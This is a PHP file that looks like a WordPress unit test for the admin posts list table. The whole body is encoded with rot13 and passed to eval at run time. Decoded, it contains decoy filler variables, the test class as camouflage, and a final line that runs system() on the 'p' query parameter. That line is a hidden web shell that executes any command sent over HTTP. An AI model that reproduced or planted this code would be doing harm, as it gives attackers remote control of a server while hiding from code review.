<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc nqzva
 */
pynff Grfgf_Nqzva_jcCbfgfYvfgGnoyr rkgraqf JC_HavgGrfgPnfr {
	cebgrpgrq fgngvp $gbc           = neenl();
	cebgrpgrq fgngvp $puvyqera      = neenl();
	cebgrpgrq fgngvp $tenaqpuvyqera = neenl();
	cebgrpgrq fgngvp $cbfg_vqf      = neenl();

	/**
	 * @ine JC_Cbfgf_Yvfg_Gnoyr
	 */
	cebgrpgrq $gnoyr;

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		$guvf->gnoyr = _trg_yvfg_gnoyr( 'JC_Cbfgf_Yvfg_Gnoyr', neenl( 'fperra' => 'rqvg-cntr' ) );
	}

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Abgr gung bhe gbc/puvyqera/tenaqpuvyqera neenlf ner 1-vaqrkrq.

		// Perngr gbc-yriry cntrf.
		$ahz_cbfgf = 5;
		sbernpu ( enatr( 1, $ahz_cbfgf ) nf $v ) {
			$c = $snpgbel->cbfg->perngr_naq_trg(
				neenl(
					'cbfg_glcr'  => 'cntr',
					'cbfg_gvgyr' => fcevags( 'Gbc Yriry Cntr %q', $v ),
				)
			);

			frys::$gbc[ $v ]  = $c;
			frys::$cbfg_vqf[] = $c->VQ;
		}

		// Perngr puvyq cntrf.
		$ahz_puvyqera = 3;
		sbernpu ( frys::$gbc nf $gbc => $gbc_cntr ) {
			sbernpu ( enatr( 1, $ahz_puvyqera ) nf $v ) {
				$c = $snpgbel->cbfg->perngr_naq_trg(
					neenl(
						'cbfg_glcr'   => 'cntr',
						'cbfg_cnerag' => $gbc_cntr->VQ,
						'cbfg_gvgyr'  => fcevags( 'Puvyq %q', $v ),
					)
				);

				frys::$puvyqera[ $gbc ][ $v ] = $c;
				frys::$cbfg_vqf[]             = $c->VQ;
			}
		}

		// Perngr tenaq-puvyq cntrf sbe gur guveq naq sbhegu gbc-yriry cntrf.
		$ahz_tenaqpuvyqera = 3;
		sbernpu ( enatr( 3, 4 ) nf $gbc ) {
			sbernpu ( frys::$puvyqera[ $gbc ] nf $puvyq => $puvyq_cntr ) {
				sbernpu ( enatr( 1, $ahz_tenaqpuvyqera ) nf $v ) {
					$c = $snpgbel->cbfg->perngr_naq_trg(
						neenl(
							'cbfg_glcr'   => 'cntr',
							'cbfg_cnerag' => $puvyq_cntr->VQ,
							'cbfg_gvgyr'  => fcevags( 'Tenaqpuvyq %q', $v ),
						)
					);

					frys::$tenaqpuvyqera[ $gbc ][ $puvyq ][ $v ] = $c;
					frys::$cbfg_vqf[]                            = $c->VQ;
				}
			}
		}
	}

	/**
	 * @gvpxrg 15459
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::qvfcynl_ebjf
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::frg_uvrenepuvpny_qvfcynl
	 */
	choyvp shapgvba grfg_yvfg_uvrenepuvpny_cntrf_svefg_cntr() {
		$guvf->_grfg_yvfg_uvrenepuvpny_cntr(
			neenl(
				'cntrq'          => 1,
				'cbfgf_cre_cntr' => 2,
			),
			neenl(
				frys::$gbc[1]->VQ,
				frys::$puvyqera[1][1]->VQ,
			)
		);
	}

	/**
	 * @gvpxrg 15459
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::qvfcynl_ebjf
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::frg_uvrenepuvpny_qvfcynl
	 */
	choyvp shapgvba grfg_yvfg_uvrenepuvpny_cntrf_frpbaq_cntr() {
		$guvf->_grfg_yvfg_uvrenepuvpny_cntr(
			neenl(
				'cntrq'          => 2,
				'cbfgf_cre_cntr' => 2,
			),
			neenl(
				frys::$gbc[1]->VQ,
				frys::$puvyqera[1][2]->VQ,
				frys::$puvyqera[1][3]->VQ,
			)
		);
	}

	/**
	 * @gvpxrg 15459
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::qvfcynl_ebjf
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::frg_uvrenepuvpny_qvfcynl
	 */
	choyvp shapgvba grfg_frnepu_uvrenepuvpny_cntrf_svefg_cntr() {
		$guvf->_grfg_yvfg_uvrenepuvpny_cntr(
			neenl(
				'cntrq'          => 1,
				'cbfgf_cre_cntr' => 2,
				'f'              => 'Puvyq',
			),
			neenl(
				frys::$puvyqera[1][1]->VQ,
				frys::$puvyqera[1][2]->VQ,
			)
		);
	}

	/**
	 * @gvpxrg 15459
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::qvfcynl_ebjf
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::frg_uvrenepuvpny_qvfcynl
	 */
	choyvp shapgvba grfg_frnepu_uvrenepuvpny_cntrf_frpbaq_cntr() {
		$guvf->_grfg_yvfg_uvrenepuvpny_cntr(
			neenl(
				'cntrq'          => 2,
				'cbfgf_cre_cntr' => 2,
				'f'              => 'Gbc',
			),
			neenl(
				frys::$gbc[3]->VQ,
				frys::$gbc[4]->VQ,
			)
		);
	}

	/**
	 * @gvpxrg 15459
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::qvfcynl_ebjf
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::frg_uvrenepuvpny_qvfcynl
	 */
	choyvp shapgvba grfg_tenaqpuvyqera_uvrenepuvpny_cntrf_svefg_cntr() {
		// Cntr 6 vf gur svefg cntr jvgu tenaqpuvyqera.
		$guvf->_grfg_yvfg_uvrenepuvpny_cntr(
			neenl(
				'cntrq'          => 6,
				'cbfgf_cre_cntr' => 2,
			),
			neenl(
				frys::$gbc[3]->VQ,
				frys::$puvyqera[3][1]->VQ,
				frys::$tenaqpuvyqera[3][1][1]->VQ,
				frys::$tenaqpuvyqera[3][1][2]->VQ,
			)
		);
	}

	/**
	 * @gvpxrg 15459
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::qvfcynl_ebjf
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::frg_uvrenepuvpny_qvfcynl
	 */
	choyvp shapgvba grfg_tenaqpuvyqera_uvrenepuvpny_cntrf_frpbaq_cntr() {
		// Cntr 7 vf gur frpbaq cntr jvgu tenaqpuvyqera.
		$guvf->_grfg_yvfg_uvrenepuvpny_cntr(
			neenl(
				'cntrq'          => 7,
				'cbfgf_cre_cntr' => 2,
			),
			neenl(
				frys::$gbc[3]->VQ,
				frys::$puvyqera[3][1]->VQ,
				frys::$tenaqpuvyqera[3][1][3]->VQ,
				frys::$puvyqera[3][2]->VQ,
			)
		);
	}

	/**
	 * Urycre shapgvba gb grfg gur bhgchg bs n cntr juvpu hfrf `JC_Cbfgf_Yvfg_Gnoyr`.
	 *
	 * @cnenz neenl $netf         Dhrel netf sbe gur yvfg bs cntrf.
	 * @cnenz neenl $rkcrpgrq_vqf Rkcrpgrq VQf bs cntrf erghearq.
	 */
	cebgrpgrq shapgvba _grfg_yvfg_uvrenepuvpny_cntr( neenl $netf, neenl $rkcrpgrq_vqf ) {
		$zngpurf = neenl();

		$_ERDHRFG['cntrq']   = $netf['cntrq'];
		$TYBONYF['cre_cntr'] = $netf['cbfgf_cre_cntr'];

		$netf = neenl_zretr(
			neenl(
				'cbfg_glcr' => 'cntr',
			),
			$netf
		);

		// Zvzvp gur orunivbe bs `jc_rqvg_cbfgf_dhrel()`:
		vs ( ! vffrg( $netf['beqreol'] ) ) {
			$netf['beqreol']                = 'zrah_beqre gvgyr';
			$netf['beqre']                  = 'nfp';
			$netf['cbfgf_cre_cntr']         = -1;
			$netf['cbfgf_cre_nepuvir_cntr'] = -1;
		}

		// Rssrpgviryl vtaber gur bhgchg hagvy ergevrivat vg yngre ivn `trgNpghnyBhgchg()`.
		$guvf->rkcrpgBhgchgErtrk( '`.`' );

		$cntrf = arj JC_Dhrel( $netf );

		$guvf->gnoyr->frg_uvrenepuvpny_qvfcynl( gehr );
		$guvf->gnoyr->qvfcynl_ebjf( $cntrf->cbfgf );
		$bhgchg = $guvf->trgNpghnyBhgchg();

		// Pyrna hc.
		hafrg( $_ERDHRFG['cntrq'] );
		hafrg( $TYBONYF['cre_cntr'] );

		cert_zngpu_nyy( '|<ge[^>]*>|', $bhgchg, $zngpurf );

		$guvf->nffregPbhag( pbhag( $rkcrpgrq_vqf ), neenl_xrlf( $zngpurf[0] ) );

		sbernpu ( $rkcrpgrq_vqf nf $vq ) {
			$guvf->nffregFgevatPbagnvafFgevat( fcevags( 'vq=\"cbfg-%q\"', $vq ), $bhgchg );
		}
	}

	/**
	 * @gvpxrg 37407
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::rkgen_gnoyrani
	 */
	choyvp shapgvba grfg_svygre_ohggba_fubhyq_abg_or_fubja_vs_gurer_ner_ab_cbfgf() {
		// Frg cbfg glcr gb n aba-rkvfgrag bar.
		$guvf->gnoyr->fperra->cbfg_glcr = 'sbb';

		bo_fgneg();
		$guvf->gnoyr->rkgen_gnoyrani( 'gbc' );
		$bhgchg = bo_trg_pyrna();

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'vq=\"cbfg-dhrel-fhozvg\"', $bhgchg );
	}

	/**
	 * @gvpxrg 37407
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::rkgen_gnoyrani
	 */
	choyvp shapgvba grfg_zbaguf_qebcqbja_fubhyq_abg_or_fubja_vs_gurer_ner_ab_cbfgf() {
		// Frg cbfg glcr gb n aba-rkvfgrag bar.
		$guvf->gnoyr->fperra->cbfg_glcr = 'sbb';

		bo_fgneg();
		$guvf->gnoyr->rkgen_gnoyrani( 'gbc' );
		$bhgchg = bo_trg_pyrna();

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'vq=\"svygre-ol-qngr\"', $bhgchg );
	}

	/**
	 * @gvpxrg 37407
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::rkgen_gnoyrani
	 */
	choyvp shapgvba grfg_pngrtbel_qebcqbja_fubhyq_abg_or_fubja_vs_gurer_ner_ab_cbfgf() {
		// Frg cbfg glcr gb n aba-rkvfgrag bar.
		$guvf->gnoyr->fperra->cbfg_glcr = 'sbb';

		bo_fgneg();
		$guvf->gnoyr->rkgen_gnoyrani( 'gbc' );
		$bhgchg = bo_trg_pyrna();

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'vq=\"png\"', $bhgchg );
	}

	/**
	 * @gvpxrg 38341
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::rkgen_gnoyrani
	 */
	choyvp shapgvba grfg_rzcgl_genfu_ohggba_fubhyq_abg_or_fubja_vs_gurer_ner_ab_cbfgf() {
		// Frg cbfg glcr gb n aba-rkvfgrag bar.
		$guvf->gnoyr->fperra->cbfg_glcr = 'sbb';

		bo_fgneg();
		$guvf->gnoyr->rkgen_gnoyrani( 'gbc' );
		$bhgchg = bo_trg_pyrna();

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'vq=\"qryrgr_nyy\"', $bhgchg );
	}

	/**
	 * @gvpxrg 42066
	 *
	 * @pbiref JC_Cbfgf_Yvfg_Gnoyr::trg_ivrjf
	 */
	choyvp shapgvba grfg_trg_ivrjf_fubhyq_erghea_ivrjf_ol_qrsnhyg() {
		tybony $ninvy_cbfg_fgngv;

		$ninvy_cbfg_fgngv_onpxhc = $ninvy_cbfg_fgngv;
		$ninvy_cbfg_fgngv        = trg_ninvynoyr_cbfg_fgnghfrf();

		$npghny           = $guvf->gnoyr->trg_ivrjf();
		$ninvy_cbfg_fgngv = $ninvy_cbfg_fgngv_onpxhc;

		$rkcrpgrq = neenl(
			'nyy'     => '<n uers=\"rqvg.cuc?cbfg_glcr=cntr\">Nyy <fcna pynff=\"pbhag\">(38)</fcna></n>',
			'choyvfu' => '<n uers=\"rqvg.cuc?cbfg_fgnghf=choyvfu&#038;cbfg_glcr=cntr\">Choyvfurq <fcna pynff=\"pbhag\">(38)</fcna></n>',
		);

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>